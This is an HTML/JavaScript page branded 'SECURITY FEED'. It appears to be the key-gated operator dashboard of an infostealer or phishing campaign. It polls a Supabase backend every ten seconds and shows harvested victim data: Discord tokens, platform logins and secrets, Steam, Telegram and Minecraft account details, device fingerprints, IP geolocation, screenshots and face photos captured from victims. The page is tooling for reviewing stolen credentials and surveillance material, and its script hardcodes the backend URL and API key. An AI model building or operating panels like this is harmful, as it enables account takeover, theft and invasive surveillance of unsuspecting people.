<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>feed</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
:root{--ink:#07070a;--panel:#0e0e13;--line:#20202b;--text:#eef0f4;--mut:#8b8fa0;--dim:#63677a;--vi:#a855f7;--ok:#3ddc97;--bad:#f4677f}
*{box-sizing:border-box}
body{margin:0;background:var(--ink);color:var(--text);font-family:"JetBrains Mono",monospace;font-size:12px}
header{display:flex;gap:10px;align-items:center;padding:12px 16px;border-bottom:1px solid var(--line)}
.brand b{color:var(--vi)}
input{background:#0a0a0e;border:1px solid var(--line);color:var(--text);padding:7px 10px;font:inherit}
button{background:#17171f;border:1px solid var(--line);color:var(--text);font:inherit;padding:7px 12px;cursor:pointer}
button:hover{border-color:var(--vi)}
main{padding:14px 16px 60px}
.card{border:1px solid var(--line);background:var(--panel);margin-bottom:12px}
.head{padding:10px 12px;display:flex;gap:10px;flex-wrap:wrap;align-items:baseline;border-bottom:1px solid var(--line)}
.who{color:#fff;font-size:13px}
.kv{color:var(--dim);font-size:11px}
.pw{color:var(--vi)}
.tag{font-size:10px;border:1px solid var(--line);padding:1px 6px;color:var(--mut)}
.tag.ok{border-color:#1f6b47;color:var(--ok)}
.tag.bad{border-color:#6b2836;color:var(--bad)}
.body{padding:10px 12px}
table{width:100%;border-collapse:collapse;margin:6px 0}
td,th{text-align:left;padding:4px 6px;border-bottom:1px solid #17171f;font-size:11.5px;word-break:break-all}
th{color:var(--dim);font-weight:400}
.pics{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0}
.pics img{height:150px;border:1px solid var(--line);cursor:zoom-in}
.pics img.screen{height:auto;width:100%;max-width:520px}
pre{white-space:pre-wrap;color:var(--mut);font-size:10.5px;max-height:200px;overflow:auto;margin:8px 0 0}
.hidden{display:none}
#gate{max-width:380px;margin:14vh auto;padding:22px;border:1px solid var(--line);background:var(--panel)}
.err{color:var(--bad);font-size:11px;min-height:14px;margin-top:8px}
</style>
</head>
<body>
<div id="gate">
  <div style="margin-bottom:10px">feed key</div>
  <input id="key" type="password" style="width:100%" autocomplete="current-password">
  <button id="open" style="width:100%;margin-top:10px">Open</button>
  <div class="err" id="err"></div>
</div>

<header class="hidden" id="bar">
  <div class="brand">SECURITY <b>FEED</b></div>
  <span id="count" class="kv"></span>
  <span style="flex:1"></span>
  <button id="refresh">refresh</button>
</header>
<main class="hidden" id="list"></main>

<script>
const db = window.supabase.createClient(
  "https://bytpztfhwdcuqozdzjeu.supabase.co",
  "sb_publishable_FIx91UXDrhOyXAQ5mJ5kaw_6xrk1ZiV"
);
const $ = id => document.getElementById(id);
let key = localStorage.getItem("portal_key") || "", runs = [], timer = null;
const esc = s => String(s == null ? "" : s).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const stamp = ts => { if (!ts) return "—"; const d = new Date(ts); return String(d.getDate()).padStart(2,"0") + "/" + String(d.getMonth()+1).padStart(2,"0") + " " + String(d.getHours()).padStart(2,"0") + ":" + String(d.getMinutes()).padStart(2,"0"); };

function drawItems(r) {
  const parts = [];
  for (const it of r.items || []) {
    const d = it.data || {};
    if (it.kind === "discord") {
      parts.push(`<div class="kv">discord tokens</div><table>${d.map(t => `<tr><td class="pw">${esc(t.token)}</td><td class="kv">${esc(t.browser||"")}</td></tr>`).join("")}</table>`);
    }
    if (it.kind === "device") {
      parts.push(`<div class="kv">${esc(d.platform||"")} ${esc(d.pv||"")} · ${esc(d.arch||"")}${esc(d.bits||"")} · ${d.cores||"?"} cores · ${esc((d.gpu||"").slice(0,60))}</div>`);
    }
    if (it.kind === "net") {
      parts.push(`<div class="kv">${esc(d.ip||"")} · ${esc(d.city||"")} ${esc(d.country||"")} · ${esc(d.isp||"")}</div>`);
    }
    if (it.kind === "apps") {
      const bits = [];
      if (d.discord) bits.push(d.discord.length + " tokens");
      if (d.telegram) bits.push("telegram " + d.telegram.files + " files");
      if (d.minecraft) bits.push(d.minecraft.length + " mc accounts");
      parts.push(`<div class="kv">apps: ${bits.join(" · ") || "none"}</div>`);
      if (d.dirs && d.dirs.length) parts.push(`<pre>${esc(d.dirs.join(" "))}</pre>`);
    }
    if (it.kind === "steam") {
      parts.push(`<div class="kv">steam: ${(d.users||[]).map(u => esc(u.acct||u.persona||u.id)).join(", ") || "no users"} · ${esc((d.files||[]).join(" "))}</div>`);
    }
  }
  return parts.join("");
}

function render() {
  $("count").textContent = runs.length + " runs";
  $("list").innerHTML = runs.map(r => {
    const t = r.tool || {}, g = (t.geo) || {};
    const codes = (r.codes || []).map(c => `<tr><td>${esc(c.platform)}</td><td>${esc(c.login)}</td><td class="pw">${esc(c.secret)}</td></tr>`).join("");
    const faces = (r.files && r.files.faces) || [];
    const screen = r.files && r.files.screen;
    const pics = (faces.length || screen)
      ? `<div class="pics">${screen ? `<img class="screen" src="${screen}">` : ""}${faces.map(f => `<img src="${f}" onclick="window.open(this.src)">`).join("")}</div>` : "";
    return `<div class="card">
      <div class="head">
        <span class="who">${esc(r.username)}</span>
        <span class="kv">${esc(r.email||"")}</span>
        <span class="pw">${esc(r.code||"")}</span>
        <span class="kv">${stamp(r.created_at)}</span>
        <span class="kv">${esc(g.city||r.city||"")} ${esc(g.country||r.country||"")}</span>
        ${faces.length ? `<span class="tag ok">${faces.length} face</span>` : ""}
        ${screen ? '<span class="tag ok">screen</span>' : ""}
        ${(r.codes||[]).length ? `<span class="tag ok">${r.codes.length} codes</span>` : ""}
        ${!r.beaconed_at && !(r.items||[]).length ? '<span class="tag bad">link only</span>' : ""}
      </div>
      <div class="body">
        ${pics}
        ${codes ? `<table><tr><th>platform</th><th>login</th><th>secret</th></tr>${codes}</table>` : ""}
        ${drawItems(r)}
        <button onclick="this.nextElementSibling.classList.toggle('hidden')">raw</button>
        <pre class="hidden">${esc(JSON.stringify(r, null, 1))}</pre>
      </div>
    </div>`;
  }).join("") || '<p class="kv">nothing yet</p>';
}

async function load() {
  if (!key) return;
  const { data, error } = await db.rpc("test_feed", { p_key: key });
  if (error) return;
  runs = data || [];
  render();
}

async function openFeed() {
  $("gate").classList.add("hidden");
  $("bar").classList.remove("hidden");
  $("list").classList.remove("hidden");
  await load();
  if (!timer) timer = setInterval(load, 10000);
}

$("open").addEventListener("click", async () => {
  key = $("key").value.trim();
  const { error } = await db.rpc("test_feed", { p_key: key });
  if (error) return $("err").textContent = "wrong key";
  localStorage.setItem("portal_key", key);
  openFeed();
});
$("refresh").addEventListener("click", load);
(async () => { if (key) { const { error } = await db.rpc("test_feed", { p_key: key }); if (!error) openFeed(); } })();
</script>
</body>
</html>
